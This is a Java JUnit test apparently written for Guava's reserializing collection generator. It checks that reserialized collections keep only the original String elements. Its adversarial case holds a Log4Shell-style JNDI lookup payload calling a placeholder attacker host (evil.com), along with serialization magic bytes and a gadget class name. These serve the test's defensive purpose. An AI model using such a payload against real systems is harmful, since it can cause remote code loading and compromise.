import com.google.common.collect.testing.ReserializingTestCollectionGenerator;
import com.google.common.collect.testing.TestCollectionGenerator;
import com.google.common.collect.testing.SampleElements;
import org.junit.Test;

import java.io.*;
import java.util.*;

import static org.junit.Assert.*;

public class ReserializingTestCollectionGeneratorSecurityTest {

    /**
     * Security invariant: Reserialization must preserve type integrity and not allow
     * arbitrary object injection. The output collection must contain only elements
     * that were in the original serialized collection, preventing deserialization gadget attacks.
     */
    @Test
    public void testReserializationPreservesCollectionIntegrity() {
        TestCollectionGenerator<String> baseGenerator = new TestCollectionGenerator<String>() {
            @Override
            public SampleElements<String> samples() {
                return new SampleElements<>("a", "b", "c", "d", "e");
            }
            @Override
            public Collection<String> create(Object... elements) {
                ArrayList<String> list = new ArrayList<>();
                for (Object e : elements) list.add((String) e);
                return list;
            }
            @Override
            public String[] createArray(int length) { return new String[length]; }
            @Override
            public Iterable<String> order(List<String> insertionOrder) { return insertionOrder; }
        };

        ReserializingTestCollectionGenerator<String> generator =
            ReserializingTestCollectionGenerator.newInstance(baseGenerator);

        // Valid input - reserialized collection must equal original
        Collection<String> result = generator.create("hello", "world");
        assertEquals(2, result.size());
        assertTrue(result.contains("hello"));
        assertTrue(result.contains("world"));

        // Boundary: empty collection
        Collection<String> empty = generator.create();
        assertTrue(empty.isEmpty());

        // Adversarial: strings that look like serialized Java object markers
        Collection<String> adversarial = generator.create(
            "\u00ac\u00ed\u0000\u0005", // Java serialization magic bytes as string
            "javax.script.ScriptEngineManager",
            "${jndi:ldap://evil.com/exploit}"
        );
        assertEquals(3, adversarial.size());
        // Invariant: output type must still be a Collection of Strings, not arbitrary objects
        for (Object item : adversarial) {
            assertTrue("Deserialized item must remain a String", item instanceof String);
        }
    }
}